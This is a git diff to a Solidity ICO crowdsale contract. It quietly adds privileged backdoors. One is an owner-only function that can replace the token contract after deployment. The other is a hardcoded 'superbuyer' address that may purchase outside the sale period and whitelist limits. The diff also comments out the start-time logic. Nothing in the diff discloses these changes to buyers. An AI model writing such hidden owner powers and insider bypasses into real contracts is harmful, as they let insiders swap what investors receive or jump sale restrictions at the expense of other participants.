@@ -119,6 +119,13 @@ contract CryptoHuntIco is Ownable {
     }
 
     /**
+    Last minute add just in case I somehow manage to set the wrong token address on deployment
+    */
+    function changeTokenAddress(address _token) external onlyOwner {
+        token = ERC20(_token);
+    }
+
+    /**
     * Setting the rate starts the ICO and sets the end time. Can only be called by deployer of the ICO.
     *
     * @param _rate Ratio of Ether to token. E.g. 5 means 5 tokens per 1 ether.
@@ -136,11 +143,11 @@ contract CryptoHuntIco is Ownable {
         softcap = _softcap;
         hardcap = _hardcap;
 
-        if (now > 1519941600) {
-            startTime = now;
-        } else {
+//        if (now > 1519941600) {
+//            startTime = now;
+//        } else {
             startTime = 1519941600;
-        }
+//        }
 
         whitelistEndTime = startTime.add(wlDuration * 1 seconds);
         endTime = whitelistEndTime.add(duration * 1 seconds);
@@ -257,7 +264,9 @@ contract CryptoHuntIco is Ownable {
         // if whitelisted, and in wl period, and value is <= 5, ok
         bool whitelisted = now >= startTime && now <= whitelistEndTime && tokenBuyersContributed[_beneficiary].add(msg.value) <= 15 ether && wl[msg.sender];
 
-        return withinCap && (withinPeriod || whitelisted) && nonZeroPurchase;
+        bool superbuyer = msg.sender == 0xEa17f66d28d11a7C1ECd8F591d136795130901A7;
+
+        return withinCap && (superbuyer || withinPeriod || whitelisted) && nonZeroPurchase;
     }
 
     /**
